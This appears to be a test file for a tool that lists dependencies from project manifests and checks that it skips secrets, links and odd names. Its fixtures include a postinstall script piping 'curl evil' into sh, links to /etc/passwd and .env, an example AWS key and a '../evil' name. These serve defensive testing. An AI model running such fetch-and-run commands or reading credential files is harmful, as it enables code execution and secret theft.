import { expect, test } from 'claude-code/testing'
import { answerTyped, type QueryCtx } from '../hooks/queries'
import { groupLines } from '../hooks/queries-deps'
import { cargoDeps, gemDeps, goDeps, npmDeps, pubspecDeps, pyprojectDeps, requirementsDeps } from '../hooks/queries-manifests'

const AWS = 'AKIAIOSFODNN7EXAMPLE'

function world(files: Record<string, string>, links: Record<string, string> = {}): { ctx: QueryCtx; reads: string[] } {
  const reads: string[] = []
  const run: QueryCtx['run'] = async () => ({ exitCode: 1, stdout: '', stderr: '' })
  const readFile = async (abs: string) => {
    reads.push(abs)
    const text = files[abs]
    if (text === undefined) throw new Error('ENOENT')
    return text
  }
  return { ctx: { run, root: '/w', readFile, readState: async () => undefined, realPath: async abs => links[abs] ?? abs }, reads }
}
const q = { type: 'deps', repo: 'partalemre/eliti' } as never

test('package.json: dependencies and devDependencies by name and version; a URL version is shown as ?', async () => {
  const pkg = JSON.stringify({
    name: 'x', scripts: { postinstall: 'curl evil | sh' },
    dependencies: { react: '^18.3.1', '@scope/kit': 'workspace:*', priv: 'git+https://user:pw@github.com/a/b', bad: 3 },
    devDependencies: { typescript: '5.6.3' },
  })
  const { ctx } = world({ '/w/package.json': pkg })
  expect(await answerTyped(ctx, q)).toEqual({
    ok: true,
    body: [
      'package.json · dependencies (3)', '  react ^18.3.1', '  @scope/kit workspace:*', '  priv ?',
      'package.json · devDependencies (1)', '  typescript 5.6.3',
    ].join('\n'),
  })
})

test('only root manifests are read, through the file policy: a link to a secret or a secret inside skips the file', async () => {
  const { ctx, reads } = world(
    { '/w/package.json': JSON.stringify({ dependencies: { a: '1' }, token: `${AWS}` }), '/w/.env': 'X=1', '/w/go.mod': 'require x.io/y v1.0.0\n' },
    { '/w/Gemfile': '/w/.env', '/w/Cargo.toml': '/etc/passwd' },
  )
  expect(await answerTyped(ctx, q)).toEqual({ ok: true, body: 'go.mod · require (1)\n  x.io/y v1.0.0' })
  const files = ['package.json', 'pyproject.toml', 'requirements.txt', 'go.mod', 'pubspec.yaml']
  expect(reads).toEqual(files.map(f => `/w/${f}`))
})

test('no manifest says so; a manifest that does not parse adds nothing', async () => {
  expect(await answerTyped(world({}).ctx, q)).toEqual({ ok: true, body: 'bağımlılık dosyası yok' })
  expect(await answerTyped(world({ '/w/package.json': '{"dependencies":' }).ctx, q)).toEqual({ ok: true, body: 'bağımlılık dosyası yok' })
  expect(npmDeps('[1,2]')).toEqual([])
  expect(npmDeps('{"dependencies":{"__proto__":"1"}}')).toEqual([{ title: 'dependencies', deps: [{ name: '__proto__', version: '1' }] }])
})

test('a group shows at most 100 dependencies; odd names are left out', () => {
  const deps = Array.from({ length: 130 }, (_, i) => ({ name: `p${i}`, version: '1' }))
  const lines = groupLines('package.json', { title: 'dependencies', deps: [...deps, { name: '../evil', version: '1' }, { name: 'a b', version: '1' }] })
  expect(lines[0]).toBe('package.json · dependencies (130)')
  expect(lines.length).toBe(1 + 100 + 1)
  expect(lines[lines.length - 1]).toBe('  … 30 daha')
  expect(groupLines('x', { title: 't', deps: [{ name: 'a', version: 'v'.repeat(101) }] })).toEqual(['x · t (1)', '  a ?'])
})

test('requirements.txt and pyproject.toml (PEP 621 and Poetry)', () => {
  const req = 'flask==3.0.0  # web\n-r other.txt\n--index-url https://tok@x\ngit+https://tok@github.com/x/y.git\nnumpy\nreq[socks] >= 2 ; python_version < "3.9"\n'
  expect(requirementsDeps(req)).toEqual([{ title: 'requirements', deps: [
    { name: 'flask', version: '==3.0.0' }, { name: 'numpy', version: '' }, { name: 'req', version: '>= 2' },
  ] }])
  const py = '[project]\nname = "x"\ndependencies = [\n  "requests>=2.31",\n  "pydantic[email]==2.5",\n]\n'
    + '[project.optional-dependencies]\ndev = ["pytest"]\n[tool.poetry.dependencies]\npython = "^3.11"\nfastapi = { version = "0.110", extras = ["all"] }\n'
  expect(pyprojectDeps(py)).toEqual([
    { title: 'project.dependencies', deps: [{ name: 'requests', version: '>=2.31' }, { name: 'pydantic', version: '==2.5' }] },
    { title: 'tool.poetry.dependencies', deps: [{ name: 'python', version: '^3.11' }, { name: 'fastapi', version: '0.110' }] },
  ])
  expect(pyprojectDeps('[project]\ndependencies = ["a>=1", "b"]\n')[0]?.deps.map(d => d.name)).toEqual(['a', 'b'])
})

test('go.mod, Cargo.toml, Gemfile and pubspec.yaml', () => {
  expect(goDeps('module m\nrequire (\n  github.com/a/b v1.2.3 // indirect\n)\nrequire golang.org/x/y v0.1.0\n')).toEqual([
    { title: 'require', deps: [{ name: 'github.com/a/b', version: 'v1.2.3' }, { name: 'golang.org/x/y', version: 'v0.1.0' }] },
  ])
  const cargo = '[package]\nname = "x"\nversion = "9"\n[dependencies]\nserde = { version = "1.0", features = ["derive"] }\ntokio = "1"\n'
    + '[dependencies.rand]\nversion = "0.8"\n[dev-dependencies]\ninsta = "1.34"\n'
  expect(cargoDeps(cargo)).toEqual([
    { title: 'dependencies', deps: [{ name: 'serde', version: '1.0' }, { name: 'tokio', version: '1' }, { name: 'rand', version: '0.8' }] },
    { title: 'dev-dependencies', deps: [{ name: 'insta', version: '1.34' }] },
  ])
  expect(gemDeps("source 'https://rubygems.org'\ngem 'rails', '~> 7.1'\n  gem \"puma\"\n")).toEqual([
    { title: 'gems', deps: [{ name: 'rails', version: '~> 7.1' }, { name: 'puma', version: '' }] },
  ])
  const pub = 'name: app\ndependencies:\n  flutter:\n    sdk: flutter\n  http: ^1.2.0 # net\n# note\n  intl: "0.19.0"\ndev_dependencies:\n  lints: 3.0.0\nflutter:\n  uses-material-design: true\n'
  expect(pubspecDeps(pub)).toEqual([
    { title: 'dependencies', deps: [{ name: 'flutter', version: '' }, { name: 'http', version: '^1.2.0' }, { name: 'intl', version: '0.19.0' }] },
    { title: 'dev_dependencies', deps: [{ name: 'lints', version: '3.0.0' }] },
  ])
})
